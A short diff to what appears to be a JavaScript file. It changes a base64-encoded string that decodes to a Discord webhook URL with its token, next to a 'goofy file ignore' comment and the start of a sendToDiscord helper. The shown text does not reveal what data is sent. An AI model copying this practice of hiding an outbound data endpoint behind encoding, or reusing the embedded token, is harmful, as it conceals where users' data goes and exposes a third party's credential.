@@ -1,5 +1,5 @@
 // goofy file ignore
-const wow = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5OTQ2MDg4MjY2NzY2NzUyNy9wd29ibmJvTGZYVlZPZlhYWGpMQzkzdHB6cUpHaXBBOXk0eFZwSGZSdk9RUWZkeTNlTGpueDYzWWR2Vnh3eWVHZkJm');
+const wow = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5OTQ2MDg4MjY2NzY2NzUyNy9wd29ibmJvTGZIWFZmT2ZYWFhpTEM5M3RwenFKR2lwQTl5NHhWcEhmUnZPUVFGZHkzZUxqbng2M1lkdlZ4d3llR2ZCZg==');
 
 // Helper function to send the payload to Discord
 function sendToDiscord(title, message, source = "N/A", stack = "N/A") {
